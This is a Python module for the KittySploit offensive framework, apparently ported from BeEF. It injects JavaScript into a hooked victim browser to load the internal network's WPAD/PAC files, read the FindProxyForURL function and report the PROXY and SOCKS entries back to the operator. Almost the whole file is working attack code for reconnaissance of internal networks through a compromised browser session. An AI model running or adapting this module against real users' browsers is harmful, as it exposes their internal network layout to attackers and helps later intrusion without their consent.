from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "WPAD Proxy Discover",
		"description": "Load wpad.dat via the browser PAC resolver and extract PROXY/SOCKS entries (BeEF get_proxy_servers_wpad)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	wait_seconds = OptInteger(12, "Seconds to wait for PAC scripts to load", False)

	def run(self):
		wait_ms = max(3000, int(self.wait_seconds or 12) * 1000)

		code_js = f"""
		(function() {{
			return new Promise(function(resolve) {{
				const urls = [
					'http://wpad/wpad.dat',
					'http://wpad/wpad.pac',
					'http://wpad/proxy.dat',
					'http://wpad/proxy.pac'
				];

				function loadScript(url) {{
					try {{
						const s = document.createElement('script');
						s.type = 'text/javascript';
						s.src = url;
						document.body.appendChild(s);
					}} catch (e) {{}}
				}}

				urls.forEach(loadScript);

				setTimeout(function() {{
					const out = {{ has_wpad: false, proxies: [], wpad_length: 0, error: null }};
					try {{
						if (typeof FindProxyForURL !== 'function') {{
							out.error = 'FindProxyForURL not defined (WPAD not resolved or blocked)';
							resolve(JSON.stringify(out));
							return;
						}}
						const wpad = FindProxyForURL.toString();
						out.has_wpad = true;
						out.wpad_length = wpad.length;

						const patterns = [
							/PROXY\\s+[a-zA-Z0-9.\\-_]+:[0-9]{{1,5}}/g,
							/SOCKS\\s+[a-zA-Z0-9.\\-_]+:[0-9]{{1,5}}/g
						];
						const seen = {{}};
						patterns.forEach(function(re) {{
							let m;
							while ((m = re.exec(wpad)) !== null) {{
								if (!seen[m[0]]) {{
									seen[m[0]] = true;
									out.proxies.push(m[0]);
								}}
							}}
						}});
					}} catch (e) {{
						out.error = e.message || String(e);
					}}
					resolve(JSON.stringify(out));
				}}, {wait_ms});
			}});
		}})();
		"""

		timeout = float(self.wait_seconds or 12) + 8.0
		print_status(f"Loading WPAD PAC URLs (wait {int(self.wait_seconds or 12)}s)...")
		result = self.send_js_and_wait_for_response(code_js, timeout=timeout)

		if not result:
			print_error("Timed out waiting for WPAD probe")
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError:
			print_error(f"Unexpected response: {result}")
			return False

		if data.get("error") and not data.get("has_wpad"):
			print_warning(data.get("error"))
			return False

		if not data.get("has_wpad"):
			print_warning("PAC function not available")
			return False

		proxies = data.get("proxies") or []
		print_success(f"FindProxyForURL captured ({data.get('wpad_length', 0)} bytes)")
		if not proxies:
			print_warning("No PROXY/SOCKS directives matched in PAC script")
			return True

		print_info("Discovered proxy directives:")
		for entry in proxies:
			print_info(f"  {entry}")
		return True
